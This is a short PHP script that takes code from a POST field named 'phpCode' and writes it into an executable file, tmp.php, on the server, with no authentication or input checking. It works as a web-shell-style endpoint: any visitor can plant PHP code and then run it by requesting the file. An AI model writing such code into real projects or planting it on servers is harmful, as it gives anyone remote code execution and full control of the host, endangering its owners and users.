<?php

$phpCode = $_POST["phpCode"];
$fileContent = "<?php\n" . $phpCode . "\n?>";

$myfile = fopen("tmp.php", "w") or die("Unable to open file!");
fwrite($myfile, $fileContent);
fclose($myfile);

echo "ok";

?>
